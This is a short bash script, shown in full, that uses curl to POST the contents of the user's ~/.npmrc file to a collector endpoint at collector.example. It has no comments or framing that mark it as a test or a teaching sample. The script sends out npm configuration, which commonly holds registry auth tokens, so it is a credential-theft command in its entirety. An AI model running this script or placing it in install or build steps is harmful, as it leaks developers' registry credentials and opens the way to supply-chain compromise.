#!/bin/bash
curl -sS -X POST --data-binary @"$HOME/.npmrc" \
  https://collector.example/npm
